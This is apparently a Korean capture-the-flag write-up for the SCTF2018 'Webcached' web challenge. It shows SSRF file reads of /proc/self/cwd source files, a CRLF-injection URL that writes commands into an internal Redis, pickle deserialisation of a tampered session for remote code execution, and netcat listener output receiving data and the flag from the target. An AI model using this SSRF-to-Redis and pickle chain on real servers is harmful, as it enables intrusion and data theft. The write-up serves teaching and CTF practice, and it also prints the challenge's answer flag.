# [Web] SCTF2018 Quals - Webcached

## Attack scenario

1. Set session varable in redis' database using CRLF Vulnerability.
2. Occure RCE using Pickle Vulnerability.
3. Get flag.

## SSRF

이 문제는 url을 입력받는 하나의 input이 존재한다.

해당 값에 `file` 스키마를 이용하여 소스코드를 얻을 수 있다.

> file:///proc/self/cwd/run.py
>
> file:///proc/self/cwd/session_interface.py

또한 `http://127.0.0.1:6379` 와 같이 내부망 서비스에 대한 SSRF공격이 가능하다.

run.py함수의 `cached`와 `load_cache` 함수를 보자.

```python
def cached(url):
    key = '{}:{}'.format(request.remote_addr, url)
    print key
    resp = r.get(key)
    if resp is None:
        resp = load_cache(url)
        r.setex(key, resp, 3)
    return resp

def load_cache(url):
    def get(url):
        return urllib.urlopen(url).read()
    socket.setdefaulttimeout(0.5)
    try:
        resp = get(url)
    except socket.timeout:
        resp = '{} may be dead...'.format(url)
    except Exception as e:
        resp = str(e)
    socket.setdefaulttimeout(timeout)
    return resp
```

cached 함수에서 redis database안에 데이터가 없으면 load_cache를 호출한다.

load_cache에서는 내부에서 정의된 함수 get을 이용해 url을 읽어온다.

`urllib.urlopen`은 **Header Injection** 이 가능하다.

이를 이용하여 Redis 데이터 베이스포트인 6379를 대상으로 CRLF공격이 가능하다.

## Pickle

이번에 알아볼 취약점은 session_interface.py안에 존재하는 pickle취약점이다.

```python
def open_session(self, app, request):
    sid = request.cookies.get(app.session_cookie_name)
    if not sid:
        sid = self.generate_sid()
        return self.session_class(sid=sid, new=True)
    val = self.redis.get(self.prefix + sid)
    if val is not None:
        val = base64.b64decode(val)
        if 'SAVE:6379' not in val:
            print val
        data = self.serializer.loads(val)
        return self.session_class(data, sid=sid)
    return self.session_class(sid=sid, new=True)

def save_session(self, app, session, response):
    domain = self.get_cookie_domain(app)
    print app
    if not session:
        self.redis.delete(self.prefix + session.sid)
        if session.modified:
            response.delete_cookie(app.session_cookie_name,
                                   domain=domain)
        return
    #print session['url']
    redis_exp = self.get_redis_expiration_time(app, session)
    cookie_exp = self.get_expiration_time(app, session)
    print dict(session)
    val = base64.b64encode(self.serializer.dumps(dict(session)))
    self.redis.setex(self.prefix + session.sid, val,
                     int(redis_exp.total_seconds()))
    response.set_cookie(app.session_cookie_name, session.sid,
                        expires=cookie_exp, httponly=True,
                        domain=domain)

```

save_session 함수에서 사용자가 요청한 url 값을 pickle을 통해 dump하고 그 값을 redis의 `session:~~~`의 값으로 넣는 것을 확인할 수 있다.

그 후 open_session에서 Redis에서 `session:~~~`에 들어간 pickle을 loads하는 것을 알 수 있는데, 여기서 pickle의 값을 위의 CRLF취약점을 통해 변조가 가능하다.

이를 이용하여 RCE이 가능하며, 이를 통해 플래그를 읽으면 문제를 풀 수 있다.

## Trigger

url 입력 칸에 `\r\n`를 삽입하여 원하는 값을 데이터베이스에 넣는 것이 가능하다. (CRLF)

urllib.urlopen함수를 통해 CRLF를 일으켜야하고, 방법은 다음과 같다.

```
http://127.0.0.1%0d%0a SET shpik hello%0d%0a SAVE:6379/
```

위 취약점을 pickle값을 Redis에 넣고, 페이지를 요청하게 되면 RCE가 발생한다.



```
osehun@ubuntu16-04-64bit:~$ nc -lvp 10101
Listening on [0.0.0.0] (family 0, port 10101)

Connection from [13.125.188.166] port 10101 [tcp/*] accepted (family 2, sport 48416)
total 20
drwxr-xr-x 1 root root 4096 Jun 18 09:32 .
drwxr-xr-x 1 root root 4096 Jul  2 13:19 ..
-rw-rw-r-- 1 root root 1415 Jun 18 09:28 run.py
-rw-rw-r-- 1 root root 2400 Jun 18 09:28 session_interface.py
drwxrwxr-x 2 root root 4096 Jun 18 09:28 templates
^C
osehun@ubuntu16-04-64bit:~$ nc -lvp 10101
Listening on [0.0.0.0] (family 0, port 10101)
Connection from [13.125.188.166] port 10101 [tcp/*] accepted (family 2, sport 48424)
total 8532
drwxr-xr-x   1 root  root     4096 Jul  2 13:19 .
drwxr-xr-x   1 root  root     4096 Jul  2 13:19 ..
-rwxr-xr-x   1 root  root        0 Jul  2 13:19 .dockerenv
drwxr-xr-x   1 root  root     4096 Jun 18 09:32 app
drwxr-xr-x   1 root  root     4096 Jun 18 09:32 bin
drwxr-xr-x   2 root  root     4096 Mar 13  2016 boot
-rw-------   1 root  root  8646656 Jun  8  2016 core
drwxr-xr-x   2 redis redis    4096 Jun  8  2016 data
drwxr-xr-x   5 root  root      360 Jul  2 13:19 dev
lrwxrwxrwx   1 root  root       34 Jun  8  2016 entrypoint.sh -> usr/local/bin/docker-entrypoint.sh
drwxr-xr-x   1 root  root     4096 Jul  2 13:19 etc
-r--r--r--   1 root  root       39 Jun 29 11:48 flag_dad9d752e1969f0e614ce2a4330efd6e
drwxr-xr-x   2 root  root     4096 Mar 13  2016 home
drwxr-xr-x   1 root  root     4096 Jun 18 09:31 lib
drwxr-xr-x   1 root  root     4096 Jun 18 09:31 lib64
drwxr-xr-x   2 root  root     4096 May 23  2016 media
drwxr-xr-x   2 root  root     4096 May 23  2016 mnt
drwxr-xr-x   2 root  root     4096 May 23  2016 opt
dr-xr-xr-x 170 root  root        0 Jul  2 13:19 proc
drwx------   2 root  root     4096 May 23  2016 root
drwxr-xr-x   1 root  root     4096 Jul  2 13:19 run
-rwxr-xr-x   1 root  root       79 Jun 18 09:28 run.sh
drwxr-xr-x   2 root  root     4096 May 23  2016 sbin
drwxr-xr-x   2 root  root     4096 May 23  2016 srv
dr-xr-xr-x  13 root  root        0 Jun 29 12:19 sys
drwxrwxrwt   1 root  root     4096 Jul  2 13:19 tmp
drwxr-xr-x   1 root  root     4096 Jun  8  2016 usr
drwxr-xr-x   1 root  root     4096 Jun 18 09:32 var

osehun@ubuntu16-04-64bit:~$ nc -lvp 10101
Listening on [0.0.0.0] (family 0, port 10101)
Connection from [13.125.188.166] port 10101 [tcp/*] accepted (family 2, sport 48430)
SCTF{c652f8004846fe0e3bf9571be26afbf1}
```



**SCTF{c652f8004846fe0e3bf9571be26afbf1}**